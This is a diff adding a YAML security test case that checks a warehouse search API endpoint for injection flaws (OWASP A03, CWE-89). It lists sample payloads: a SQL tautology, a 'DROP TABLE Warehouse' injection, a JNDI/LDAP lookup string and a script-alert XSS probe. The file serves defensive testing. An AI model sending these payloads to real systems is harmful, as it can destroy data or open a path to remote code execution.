@@ -1,0 +1,19 @@
+# sec-035-warehouse-a03-injection: Warehouse: A03 Injection in search
+id: sec-035-warehouse-a03-injection
+title: "Warehouse: A03 Injection in search"
+module: warehousing
+table: Warehouse
+owasp: "A03:2021 Injection"
+cwe: CWE-89
+severity: high
+target:
+  method: GET
+  path: "/api/warehousing/warehouses?q="
+payloads:
+  - "' OR '1'='1"
+  - "\"; DROP TABLE Warehouse; --"
+  - "${jndi:ldap://x}"
+  - "<script>alert(1)</script>"
+expected: "200 with an empty or filtered page; WarehouseName search is parameterised; no stack trace"
+legacy_reference: legacy/warehousing/si_warehouse.p
+automated_by: zap-baseline + custom request runner
